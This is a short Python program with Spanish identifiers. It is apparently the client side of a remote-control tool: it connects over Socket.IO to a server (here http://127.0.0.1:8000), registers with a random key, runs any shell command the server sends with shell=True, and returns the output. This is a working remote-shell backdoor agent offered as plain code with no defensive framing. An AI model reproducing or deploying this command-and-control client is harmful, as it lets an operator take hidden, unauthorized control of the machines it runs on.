import logging
import socketio
import subprocess
import os
import random
import string

def generar_clave():
    longitud = 10
    caracteres = string.ascii_letters + string.digits  # letras y dígitos
    clave = ''.join(random.choice(caracteres) for _ in range(longitud))
    return clave

clave = generar_clave()
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

sio = socketio.Client()



@sio.on("connect")
def connect():
    print('Conectado al servidor')
    sio.emit("linea",clave)

def execute_command(command):
    try:
        if command.startswith("cd"):
            new_directory = command.split(maxsplit=1)[1]
            try:
                os.chdir(new_directory)
                sio.emit("recibirInfo", "Directorio cambiado a: " + new_directory)
            except Exception as e:
                sio.emit("recibirInfo", "Error al cambiar de directorio, verifica la sintaxis")
        else:
    
            completed_process = subprocess.run(command, check=True, shell=True, capture_output=True, text=True)
            if completed_process.stdout:
                sio.emit("recibirInfo", completed_process.stdout)
         
            if completed_process.stderr:
                sio.emit("recibirInfo", completed_process.stderr)
    except subprocess.CalledProcessError as e:
        logger.error(f"Error al ejecutar el comando '{command}': {e}")
        sio.emit("recibirInfo", f"Error al ejecutar el comando '{command}': {e}")
    except Exception as e:
        logger.error(f"Error inesperado: {e}")
        sio.emit("recibirInfo", f"Error inesperado: {e}")

@sio.on(f'controlar{clave}')
def on_message(data):
    print(data)
    execute_command(data)


sio.connect("http://127.0.0.1:8000")

while True:
    sio.sleep(1)